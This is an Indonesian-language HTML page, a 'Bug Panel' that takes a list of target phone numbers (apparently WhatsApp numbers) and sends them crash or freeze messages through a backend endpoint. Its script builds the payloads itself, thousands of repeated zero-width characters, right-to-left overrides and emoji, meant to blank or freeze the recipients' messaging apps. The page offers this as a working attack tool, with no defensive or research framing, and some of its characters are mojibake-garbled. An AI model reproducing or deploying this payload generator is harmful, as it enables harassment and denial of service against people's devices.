<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <title>Zionixszy Bug</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      max-width: 500px;
      margin: 40px auto;
      padding: 20px;
      background: #0f0f0f;
      color: #eee;
    }

    h2 {
      text-align: center;
      color: #00ffe1;
      text-shadow: 0 0 5px #00ffe1;
    }

    input, select {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: none;
      border-radius: 8px;
      background: #1e1e1e;
      color: #fff;
    }

    .btn {
      width: 100%;
      padding: 14px;
      margin-top: 12px;
      font-weight: bold;
      font-size: 16px;
      border-radius: 10px;
      border: none;
      transition: 0.3s;
    }

    .btn-glow {
      background: linear-gradient(45deg, #00ffe1, #006eff);
      color: black;
      box-shadow: 0 0 12px #00ffe1, 0 0 18px #006eff;
    }

    .btn-glow:hover {
      transform: scale(1.05);
      box-shadow: 0 0 20px #00ffe1, 0 0 25px #006eff;
    }

    .btn-plain {
      background: #1e1e1e;
      color: #ccc;
      border: 1px solid #333;
    }

    .btn-plain:hover {
      background: #2a2a2a;
      transform: scale(1.02);
    }

    #status {
      margin-top: 18px;
      font-weight: bold;
      text-align: center;
    }

    #jumlah {
      margin-top: 10px;
      text-align: center;
      font-size: 14px;
      color: #aaa;
    }
  </style>
</head>
<body>
  <h2>Zionixszy Bug Panel</h2>

  <label for="numbers">Nomor Target (pisahkan dengan koma):</label>
  <input id="numbers" placeholder="628123xxxxxx,628222xxxxxx" />

  <div id="jumlah">Jumlah target: 0</div>

  <label for="bugType">Pilih Jenis Bug:</label>
  <select id="bugType">
    <option value="blank">üí® UI Delay / Blank</option>
    <option value="freeze">‚ùÑÔ∏è Freeze Emoji + RTL</option>
    <option value="lite">ü´ß Kosong Ringan</option>
  </select>

  <button class="btn btn-plain" onclick="cekJumlah()">üîç Cek Jumlah Target</button>
  <button class="btn btn-glow" onclick="send()">üöÄ Kirim Unicode Bug</button>

  <p id="status"></p>

  <script>
    function getBug(type) {
      switch (type) {
        case 'blank':
          return '\u2063\u200F\u202E\u200B\u2060'.repeat(3000);
        case 'freeze':
          return 'ü§£'.repeat(1500) + '\u202E'.repeat(1500) + '‚Äè'.repeat(1000);
        case 'lite':
          return '\u200B\u2060'.repeat(500);
        default:
          return '...';
      }
    }

    function cekJumlah() {
      const raw = document.getElementById('numbers').value.trim();
      const list = raw.split(',').map(n => n.trim()).filter(n => n);
      document.getElementById('jumlah').textContent = `Jumlah target: ${list.length}`;
    }

    async function send() {
      const status = document.getElementById('status');
      const raw = document.getElementById('numbers').value.trim();
      const bugType = document.getElementById('bugType').value;
      const list = raw.split(',').map(n => n.trim()).filter(n => n);
      const message = getBug(bugType);

      if (list.length === 0) {
        alert('Masukkan minimal satu nomor!');
        return;
      }

      status.textContent = '‚è≥ Mengirim‚Ä¶';

      try {
        const res = await fetch('/api/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(
            list.length > 1
              ? { list, message }
              : { number: list[0], message }
          )
        });

        const json = await res.json();

        if (json.ok) {
          status.innerHTML = `‚úÖ <b>Berhasil kirim!</b><br>Nomor terkirim: ${list.length}`;
        } else {
          status.innerHTML = `‚ùå <b>Gagal:</b> ${json.error}`;
        }
      } catch (err) {
        status.innerHTML = `‚ùå <b>Error:</b> ${err.message}`;
      }
    }
  </script>
</body>
</html>
